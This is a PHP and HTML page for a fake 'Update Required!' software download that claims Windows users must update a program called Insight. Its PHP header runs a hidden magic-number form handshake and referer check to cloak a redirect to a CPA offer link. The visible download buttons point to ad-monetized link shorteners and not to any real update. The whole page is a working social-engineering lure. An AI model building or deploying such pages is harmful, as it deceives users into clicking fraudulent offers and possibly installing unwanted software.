<?php
$magic_number = 9996;
$cpa_offer_url = 'http://viid.me/qlJlmJ';
//$cpa_offer_url = 'http://sh.st/AeotZ';
//$cpa_offer_url = 'http://cur.lv/yw3p0';

$PHP_SELF = preg_replace( "/index.php/", "", $_SERVER['PHP_SELF'] );


//Don't edit below this line unless you know what you are doing.

if (isset($_GET['mn']) && $_GET['mn']==$magic_number){		

		echo '<html><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"></head><body><form action="' . 'http://'.$_SERVER['HTTP_HOST'].$PHP_SELF. '" method="post" id="form1">

<input type="hidden"  name="mn" value="' . $magic_number . '" /></form>

<script language="JavaScript"> 
	document.getElementById(\'form1\').submit();</script></body></html>';
		return true; 
		exit();
}

if ($_POST['mn']==$magic_number){		

	echo '<html><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"></head><body><form action="' . 'http://'.$_SERVER['HTTP_HOST'].$PHP_SELF. '" method="post" id="form1">

<input type="hidden"  name="mn" value="' . $magic_number . $magic_number . '" /></form>

<script language="JavaScript"> 
	document.getElementById(\'form1\').submit();</script></body></html>';
		return true; 
		exit();
}	

$dom = preg_replace( "/^www\./", "", $_SERVER[ 'HTTP_HOST' ] ) ;
$ref= $_SERVER['HTTP_REFERER'];


if (((strpos($ref, $dom)!=FALSE) || (trim($ref)=="" ) ) && (!isset($_GET['mn']))  && ($_POST['mn']==$magic_number.$magic_number)){
		header( 'Location: ' . $cpa_offer_url);
		exit();
	}


?>


<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Free coming soon template with jQuery countdown">
    <meta name="author" content="http://bootstraptaste.com">
    <link rel="shortcut icon" href="assets/img/favicon.png">

    <title>Update Required!</title>

    <!-- Bootstrap -->
    <link href="assets/css/bootstrap.css" rel="stylesheet">
	<link href="assets/css/bootstrap-theme.css" rel="stylesheet">

    <!-- siimple style -->
    <link href="assets/css/style.css" rel="stylesheet">
    
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->
  </head>

  <body>

	<div id="wrapper">
		<div class="container">
			<div class="row">
				<div class="col-sm-12 col-md-12 col-lg-12">
					<h1>Download Insight 2.5</h1>
					<h2 class="subtitle">If you're using Winodws 7 or above, it's required to update Insight to version 3. Please use following link to download!</h2><br/><br/>
					<form class="form-inline signup" role="form">
					  <div class="form-group">
					  <button type="submit" class="btn btn-theme" ><a href="http://adfoc.us/3561071">Download Update (44.2MB)</a></button><br/>(<a href="http://sh.st/AeotZ" target="_blank">Alternative Download Link</a>)
					</form>		
					
				</div>
				
			</div>
			<div class="row">
				<div class="col-lg-6 col-lg-offset-3">
						<p class="copyright">Copyright &copy; 2016 Insight</p>
                        <!-- 
                            All links in the footer should remain intact. 
                            Licenseing information is available at: http://bootstraptaste.com/license/
                            You can buy this theme without footer links online at: http://bootstraptaste.com/buy/?theme=WeBuild
                        -->
				</div>
			</div>		
		</div>
	</div>
    <script src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
	<script src="assets/js/jquery.countdown.min.js"></script>
	<script type="text/javascript">
  $('#countdown').countdown('2015/01/01', function(event) {
    $(this).html(event.strftime('%w weeks %d days <br /> %H:%M:%S'));
  });
</script>
  </body>
</html>